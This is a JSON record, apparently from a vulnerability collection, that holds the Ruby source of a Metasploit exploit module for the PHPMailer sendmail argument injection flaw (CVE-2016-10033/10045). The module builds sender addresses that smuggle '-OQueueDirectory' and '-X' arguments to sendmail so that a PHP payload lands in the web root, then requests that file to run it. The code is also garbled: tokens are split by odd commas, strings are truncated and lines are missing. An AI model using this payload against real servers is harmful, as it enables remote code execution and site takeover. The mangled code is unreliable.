{
    "text": "vul_name : PHPMailer Sendmail Argument Injection ， vul_cve : CVE-2016-10033 , CVE-2016-10045 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， require 'msf/core' ， class MetasploitModule < Msf : Exploit : Remote ， Rank = ManualRanking ， include Msf : Exploit : FileDropper ， include Msf : Exploit : Remote : HttpClient ， super ( update_info ( info ,  ， 'Name' => 'PHPMailer Sendmail Argument Injection' ,  ， 'Description' => %q{ ， PHPMailer versions up to and including 5.2.19 are affected by a ， vulnerability which can be leveraged by an attacker to write a file with ， partially controlled contents to an arbitrary location through injection ， of arguments that are passed to the sendmail binary. This module ， writes a payload to the web root of the webserver before then executing ， it with an HTTP request. The user running PHPMailer must have write ， access to the specified WEB_ROOT directory and successful exploitation ， can take a few minutes. ， } ,  ， 'Author' => [  ， 'Dawid Golunski' ,  # vulnerability discovery and original PoC ， 'Spencer McIntyre' # metasploit module ，  ]  ,  ， 'License' => MSF_LICENSE ,  ， ' ，  [ 'CVE' , '2016-10033' ]  ,  ，  [ 'CVE' , '2016-10045' ]  ,  ，  [ 'EDB' , '40968' ]  ,  ，  [ 'EDB' , '40969' ]  ,  ，  [ 'URL' , ' ，  [ 'URL' , ' ，  ]  ,  ， 'DisclosureDate' => 'Dec 26 2016' ,  ， 'Platform' => 'php' ,  ， 'Arch' => ARCH_PHP ,  ， 'Payload' => {'DisableNops' => true} ,  ， 'Targets' => [  ，  [ 'PHPMailer <5.2.18' , {} ]  ,  ，  [ 'PHPMailer 5.2.18 - 5.2.19' , {} ]  ，  ]  ,  ， 'DefaultTarget' => 0 ， register_options (  ，  [  ， OptString.new ( 'TARGETURI' ,  [ true , 'Path to the application root' , '/' ]  )  ,  ， OptString.new ( 'TRIGGERURI' ,  [ false , 'Path to the uploaded payload' , ' ]  )  ,  ， OptString.new ( 'WEB_ROOT' ,  [ true , 'Path to the web root' , '/var/www' ]  )  ，  ]  , self.class )  ， register_advanced_options (  ，  [  ， OptInt.new ( 'WAIT_TIMEOUT' ,  [ true , 'Seconds to wait to trigger the payload' , 300 ]  )  ，  ]  , self.class )  ， end ， print_status ( \"Sleeping before requesting the payload from :  # {trigger_uri}\" )  ， page_found = false ， sleep_time = 10 ， wait_time = datastore [ 'WAIT_TIMEOUT' ]  ， print_status ( \"Waiting for up to # {wait_time} seconds to trigger the payload\" )  ， sleep ( sleep_time )  ， wait_time -= sleep_time ， res = send_request_cgi (  ， 'method' => 'GET' ,  ， 'uri' => trigger_uri ， print_good ( 'Successfully triggered the payload' )  ， end ， next ， end ， next unless res.code = 200 ， print_good ( 'Successfully found the payload' )  ， page_found = true ， end ， end ， end ， def exploit ， payload_file_name = \" # {rand_text_alphanumeric ( 8 ) }.php\" ， payload_file_path = \" # {datastore [ 'WEB_ROOT' ] }/ # {payload_file_name}\" ， email = \"\\\" # {rand_text_alphanumeric ( 4 + rand ( 8 ) }\\\" -OQueueDirectory=/tmp -X # {payload_file_path} # {rand_text_alphanumeric ( 4 + rand ( 8 ) }\\\" @  # {rand_text_alphanumeric ( 4 + rand ( 8 ) }.com\" ， elsif target.name = 'PHPMailer 5.2.18 - 5.2.19' ， email = \"\\\" # {rand_text_alphanumeric ( 4 + rand ( 8 ) }\\' -OQueueDirectory=/tmp -X # {payload_file_path} # {rand_text_alphanumeric ( 4 + rand ( 8 ) }\\\" @  # {rand_text_alphanumeric ( 4 + rand ( 8 ) }.com\" ， fail_with ( Failure : NoTarget , 'The specified version is not supported' )  ， end ， data = Rex : MIME : Message.new ， data.add_part ( 'submit' , nil , nil , 'form-data ; name=\"action\"' ) ",
    "time": "2017.01.04"
}